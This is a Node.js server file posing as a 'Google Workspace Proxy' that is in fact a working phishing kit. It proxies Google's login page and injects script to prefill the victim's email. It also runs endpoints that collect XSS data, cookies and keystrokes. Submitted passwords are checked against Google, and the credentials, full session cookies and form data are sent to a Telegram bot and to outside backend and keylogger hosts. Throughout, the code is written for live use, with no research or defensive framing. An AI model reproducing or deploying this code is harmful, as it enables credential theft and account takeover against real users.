const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');

// ============================================================
//  ENVIRONMENT VARIABLES
// ============================================================

require('dotenv').config();

// Core Configuration
const PORT = process.env.PORT || 3000;
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Google OAuth Configuration
const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID || 'google-proxy-client';
const GOOGLE_REDIRECT_URI = process.env.GOOGLE_REDIRECT_URI || 'https://accounts.google.com/o/oauth2/auth';

// Path Configuration
const PATHS = {
    script: "/inject.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    loginPath: "/login",
    healthPath: "/health",
    sessionsPath: "/sessions"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║        ✅  GOOGLE WORKSPACE PROXY v2.0                   ║');
console.log('║        🔐  Enhanced with Full Error Handling             ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
console.log(`║   🔗 Backend:   ${BACKEND_URL}                          ║`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  SESSION STORAGE
// ============================================================

const userSessions = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000; // 1 hour

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = userSessions[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete userSessions[sessionId];
        return null;
    }
    return session;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    userSessions[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        cookies: [],
        xssData: [],
        keystrokes: [],
        formData: [],
        credentials: [],
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        verified: false
    };
    console.log(`[SESSION] ✅ Created session ${sessionId.substring(0, 12)} for email: ${email}`);
    return sessionId;
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();
    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  TELEGRAM NOTIFICATIONS - FULL DATA, NO TRUNCATION
// ============================================================

async function sendToTelegram(email, password, cookies, ip, targetUrl, fullData = {}, sessionId = null, success = false) {
    try {
        const fetch = require('node-fetch');
        const botToken = TELEGRAM_BOT_TOKEN;
        const chatId = TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('[TELEGRAM] ⚠️ Missing credentials');
            return;
        }

        let msg = `🔐 *GOOGLE WORKSPACE CAPTURE*\n\n`;
        msg += `*📧 Email:* ${email || 'unknown'}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*📡 IP:* ${ip || 'unknown'}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
        msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;
        msg += `*🎯 Service:* Google Workspace / Gmail\n`;
        
        // ✅ FULL COOKIES - NO TRUNCATION
        if (cookies && Object.keys(cookies).length > 0) {
            msg += `\n*🍪 FULL COOKIES (HttpOnly):*\n`;
            for (const [name, value] of Object.entries(cookies)) {
                msg += `  \`${name}\`: \`${value}\`\n`;
            }
        }
        
        // Full form data - NO TRUNCATION
        if (fullData && Object.keys(fullData).length > 0) {
            msg += `\n*📝 FULL FORM DATA:*\n\`\`\`json\n${JSON.stringify(fullData, null, 2)}\n\`\`\``;
        }

        // Send to Telegram
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: msg.substring(0, 4096), // Telegram limit
                    parse_mode: 'Markdown'
                })
            });

            if (response.ok) {
                console.log('[TELEGRAM] ✅ Sent');
            } else {
                const errorText = await response.text();
                console.log('[TELEGRAM] ❌ Failed:', response.status, errorText);
            }
        } catch (e) {
            console.log('[TELEGRAM] ❌ Error:', e.message);
        }

    } catch (error) {
        console.error('[TELEGRAM] ❌ Error:', error.message);
    }
}

// ============================================================
//  VERIFY WITH GOOGLE
// ============================================================

function verifyWithGoogle(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            Email: email,
            Passwd: password,
            accountType: 'HOSTED_OR_GOOGLE',
            service: 'mail',
            source: 'Chameleon-Proxy'
        });
        
        const options = {
            hostname: 'accounts.google.com',
            path: '/ServiceLoginAuth',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const cookies = res.headers['set-cookie'] || [];
                const cookieObj = {};
                cookies.forEach(cookie => {
                    const parts = cookie.split(';')[0].split('=');
                    if (parts.length === 2) {
                        cookieObj[parts[0]] = parts[1];
                    }
                });
                
                const success = data.includes('Gmail') || 
                              data.includes('https://mail.google.com') ||
                              data.includes('_auth') ||
                              cookies.some(c => c.includes('SAPISID') || c.includes('HSID'));
                
                console.log(`[AUTH] Google verification ${success ? '✅ SUCCESS' : '❌ FAILED'} for ${email}`);
                
                resolve({
                    success: success,
                    cookies: cookieObj,
                    html: data
                });
            });
        });
        
        req.on('error', (err) => {
            console.error('[AUTH] Error:', err.message);
            resolve({ success: false, cookies: null, html: '' });
        });
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  SERVE FILES - ✅ ENHANCED with proper error handling
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            serve404Page(res);
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        });
        res.end(data);
    });
}

// ============================================================
//  404 Page Handler
// ============================================================

function serve404Page(res) {
    const filePath = path.join(__dirname, '404_not_found.html');
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head><title>404 Not Found</title></head>
                <body>
                    <h1>Not Found</h1>
                    <p>The requested URL was not found on this server.</p>
                </body>
                </html>
            `);
            return;
        }
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(data);
    });
}

// ============================================================
//  HANDLE XSS COLLECTION
// ============================================================

function handleXSSCollection(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[XSS] 📥 Received data from ${ip}`);
            
            if (sessionId && userSessions[sessionId]) {
                userSessions[sessionId].xssData.push({
                    ...data,
                    timestamp: Date.now(),
                    ip: ip
                });
                userSessions[sessionId].lastActivity = Date.now();
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[XSS] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE COOKIE CAPTURE
// ============================================================

function handleCookieCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[COOKIE] 🍪 Received cookies from ${ip}`);
            
            if (sessionId && userSessions[sessionId]) {
                userSessions[sessionId].cookies.push({
                    ...data,
                    timestamp: Date.now(),
                    ip: ip
                });
                userSessions[sessionId].lastActivity = Date.now();
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[COOKIE] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE KEYLOG
// ============================================================

function handleKeylog(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[KEYLOG] ⌨️ Received keystrokes from ${ip}`);
            
            if (sessionId && userSessions[sessionId]) {
                userSessions[sessionId].keystrokes.push({
                    keystrokes: data.keystrokes,
                    timestamp: Date.now(),
                    ip: ip
                });
                userSessions[sessionId].lastActivity = Date.now();
                
                if (KEYLOGGER_URL) {
                    const fetch = require('node-fetch');
                    fetch(KEYLOGGER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ...data,
                            sessionId: sessionId,
                            ip: ip,
                            service: 'Google Workspace'
                        })
                    }).catch(() => {});
                }
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[KEYLOG] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  ✅ ENHANCED HANDLE LOGIN REQUEST - WITH FULL DEBUGGING
// ============================================================

function handleLoginRequest(req, res) {
    console.log(`[LOGIN] 🔐 Request received: ${req.url}`);

    const emailParam = req.url.match(/login_hint=([^&]+)/);
    const email = emailParam ? decodeURIComponent(emailParam[1]) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (!email) {
        console.warn('[LOGIN] ⚠️ No email provided, redirecting to Google');
        res.writeHead(302, { 'Location': 'https://accounts.google.com/ServiceLogin' });
        res.end();
        return;
    }

    console.log(`[LOGIN] 📧 Email: ${email}`);
    console.log(`[LOGIN] 📡 IP: ${ip}`);

    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    console.log(`[LOGIN] 🆔 Session: ${sessionId}`);

    // ✅ Build Google login URL with email pre-filled
    const targetUrl = `https://accounts.google.com/ServiceLogin?` +
        `Email=${encodeURIComponent(email)}&` +
        `continue=https://mail.google.com/mail&` +
        `service=mail&` +
        `hl=en&` +
        `flowName=GlifWebSignIn&` +
        `flowEntry=ServiceLogin`;

    console.log(`[LOGIN] 🔗 Fetching: ${targetUrl}`);

    // ✅ Recursive function to handle redirects
    function fetchUrl(url, redirectCount = 0) {
        if (redirectCount > 5) {
            console.error('[LOGIN] ❌ Too many redirects');
            res.writeHead(500);
            res.end('Too many redirects');
            return;
        }

        https.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache'
            }
        }, (targetRes) => {
            console.log(`[LOGIN] 📥 Response status: ${targetRes.statusCode}`);
            console.log(`[LOGIN] 📄 Response Headers: ${JSON.stringify(targetRes.headers)}`);

            // ✅ Handle redirects
            if (targetRes.statusCode === 301 || targetRes.statusCode === 302 || targetRes.statusCode === 303) {
                const redirectUrl = targetRes.headers.location;
                console.log(`[LOGIN] 🔄 Redirecting to: ${redirectUrl}`);
                fetchUrl(redirectUrl, redirectCount + 1);
                return;
            }

            let data = [];
            targetRes.on('data', chunk => data.push(chunk));
            targetRes.on('end', () => {
                let body = Buffer.concat(data).toString();
                
                // --- ✅ FULL DEBUG LOGGING ---
                console.log(`[LOGIN] 📄 Body length: ${body.length}`);
                console.log(`[LOGIN] 📄 Body Preview (first 500 chars): ${body.substring(0, 500)}`);
                if (body.length < 100) {
                    console.log(`[LOGIN] ⚠️ WARNING: Response body is very small (${body.length} chars). Possible redirect or error.`);
                    console.log(`[LOGIN] 📄 Full body: ${body}`);
                }
                // --- END DEBUG LOGGING ---

                // ✅ Check if response is HTML or error
                if (body.includes('Gmail') || body.includes('accounts.google.com')) {
                    console.log('[LOGIN] ✅ Valid Google login page received');
                } else if (body.includes('error') || body.includes('denied') || body.includes('blocked')) {
                    console.log('[LOGIN] ⚠️ Error detected in response');
                }

                // ✅ Inject script with email pre-filled
                const injectionScript = `
                <script>
                    console.log('🔐 Google Proxy loaded');
                    window.GOOGLE_CONFIG = {
                        BACKEND_URL: '${BACKEND_URL}',
                        KEYLOGGER_URL: '${KEYLOGGER_URL}',
                        XSS_ENDPOINT: '${PATHS.xssEndpoint}',
                        COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
                        KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
                        SESSION_ID: '${sessionId}',
                        EMAIL: '${email}',
                        SERVICE: 'Google Workspace'
                    };
                    console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
                    console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
                    
                    // Auto-fill email on page load
                    document.addEventListener('DOMContentLoaded', function() {
                        const email = '${email}';
                        const emailField = document.querySelector('input[name="Email"]') || 
                                          document.querySelector('input[type="email"]') ||
                                          document.querySelector('input[name="identifier"]') ||
                                          document.querySelector('#identifierId');
                        if (emailField) {
                            emailField.value = email;
                            const event = new Event('input', { bubbles: true });
                            emailField.dispatchEvent(event);
                            console.log('✅ Auto-filled email:', email);
                        } else {
                            console.log('⚠️ Email field not found, retrying...');
                            setTimeout(function() {
                                const retryField = document.querySelector('input[name="Email"]') || 
                                                   document.querySelector('input[type="email"]');
                                if (retryField) {
                                    retryField.value = email;
                                    const event = new Event('input', { bubbles: true });
                                    retryField.dispatchEvent(event);
                                    console.log('✅ Auto-filled email (retry):', email);
                                }
                            }, 1000);
                        }
                    });
                </script>
                <script src="${PATHS.script}"></script>
                `;
                
                body = body.replace(/<\/body>/i, injectionScript + '</body>');
                
                res.writeHead(200, {
                    'Content-Type': 'text/html',
                    'Cache-Control': 'no-store, no-cache, must-revalidate'
                });
                res.end(body);
                console.log('[LOGIN] ✅ Response sent to client');
            });
        }).on('error', (err) => {
            console.error(`[LOGIN] ❌ Error: ${err.message}`);
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
        });
    }

    fetchUrl(targetUrl);
}

// ============================================================
//  HANDLE POST REQUEST - Capture and Verify Credentials
// ============================================================

async function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        let email = formData.Email || formData.email || formData.identifier || '';
        const password = formData.Passwd || formData.passwd || formData.password || '';
        
        if (!email && sessionId && userSessions[sessionId]) {
            email = userSessions[sessionId].email;
        }
        
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) email = decodeURIComponent(match[1]);
        }
        
        if (!email) {
            console.warn('[POST] No email found');
            res.writeHead(302, { 'Location': 'https://accounts.google.com/ServiceLogin' });
            res.end();
            return;
        }

        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);

        const verifyResult = await verifyWithGoogle(email, password);
        
        let allCookies = {};
        if (sessionId && userSessions[sessionId]) {
            userSessions[sessionId].credentials.push({
                email: email,
                password: password,
                timestamp: Date.now(),
                ip: ip,
                success: verifyResult.success,
                attempt: attemptCount
            });
            userSessions[sessionId].attempts = attemptCount;
            userSessions[sessionId].verified = verifyResult.success;
            
            if (verifyResult.cookies && Object.keys(verifyResult.cookies).length > 0) {
                userSessions[sessionId].cookies.push({
                    cookies: verifyResult.cookies,
                    timestamp: Date.now(),
                    source: 'google_verification',
                    success: verifyResult.success
                });
                allCookies = verifyResult.cookies;
            }
        }

        await sendToTelegram(
            email,
            password,
            allCookies,
            ip,
            req.url,
            formData,
            sessionId,
            verifyResult.success
        );

        try {
            const fetch = require('node-fetch');
            await fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: verifyResult.success ? 'login_success' : 'login_failed',
                    email: email,
                    password: password,
                    service: 'Google Workspace',
                    targetUrl: req.url,
                    ip: ip,
                    sessionId: sessionId,
                    timestamp: new Date().toISOString(),
                    formData: formData,
                    cookies: allCookies,
                    verified: verifyResult.success
                })
            });
        } catch (e) {
            console.log('[BACKEND] ⚠️ Failed to log:', e.message);
        }

        if (verifyResult.success) {
            console.log(`[AUTH] ✅ Valid credentials: ${email}`);
            res.writeHead(302, { 
                'Location': 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true',
                'Cache-Control': 'no-store'
            });
            res.end();
        } else {
            console.log(`[AUTH] ❌ Invalid credentials: ${email}`);
            res.writeHead(302, { 
                'Location': `https://accounts.google.com/ServiceLogin?Email=${encodeURIComponent(email)}&error=invalid_credentials`,
                'Cache-Control': 'no-store'
            });
            res.end();
        }

    } catch (error) {
        console.error('[ERROR] POST handling:', error.message);
        console.error('[ERROR] Stack:', error.stack);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

// ============================================================
//  ✅ MAIN SERVER - Enhanced with proper error handling
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // --- Serve files ---
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === PATHS.script) {
        serveFile('script_inject.js', res, 'text/javascript');
        return;
    }

    // --- Health check ---
    if (req.url === PATHS.healthPath) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            uptime: process.uptime(),
            sessions: Object.keys(userSessions).length,
            service: 'Google Workspace Proxy',
            version: '2.0.0'
        }));
        return;
    }

    // --- Sessions admin ---
    if (req.url === PATHS.sessionsPath && req.method === 'GET') {
        const sessionData = Object.keys(userSessions).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: userSessions[id].email || 'N/A',
            ip: userSessions[id].ip || 'N/A',
            created: userSessions[id].created,
            attempts: userSessions[id].attempts || 0,
            verified: userSessions[id].verified || false,
            xssCount: (userSessions[id].xssData || []).length,
            cookieCount: (userSessions[id].cookies || []).length,
            keystrokeCount: (userSessions[id].keystrokes || []).length
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData
        }, null, 2));
        return;
    }

    // --- XSS Collection endpoint ---
    if (req.url === PATHS.xssEndpoint && req.method === 'POST') {
        handleXSSCollection(req, res);
        return;
    }

    // --- Cookie Capture endpoint ---
    if (req.url === PATHS.cookieEndpoint && req.method === 'POST') {
        handleCookieCapture(req, res);
        return;
    }

    // --- Keylog endpoint ---
    if (req.url === PATHS.keylogEndpoint && req.method === 'POST') {
        handleKeylog(req, res);
        return;
    }

    // --- POST requests ---
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // --- Login requests ---
    if (req.url.startsWith(PATHS.loginPath)) {
        handleLoginRequest(req, res);
        return;
    }

    // --- ✅ 404 - Handle all other requests with custom 404 page ---
    console.log(`[404] 🔍 Not Found: ${req.url}`);
    serve404Page(res);
});

// ============================================================
//  CLEANUP SESSIONS (every 5 minutes)
// ============================================================

setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    for (const [id, session] of Object.entries(userSessions)) {
        if (now - session.timestamp > SESSION_TTL) {
            delete userSessions[id];
            cleaned++;
        }
    }
    if (cleaned > 0) {
        console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
    }
}, 5 * 60 * 1000);

// ============================================================
//  START SERVER
// ============================================================

server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║        ✅  GOOGLE WORKSPACE PROXY v2.0                   ║');
    console.log('║        🔐  Gmail/GSuite + Full Cookie Capture           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
    console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
    console.log(`║   🔗 Health:    ${PATHS.healthPath}                     ║`);
    console.log(`║   🔗 Sessions:  ${PATHS.sessionsPath}                   ║`);
    console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
    console.log(`║   📊 Active:    ${Object.keys(userSessions).length} sessions`);
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  GRACEFUL SHUTDOWN
// ============================================================

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});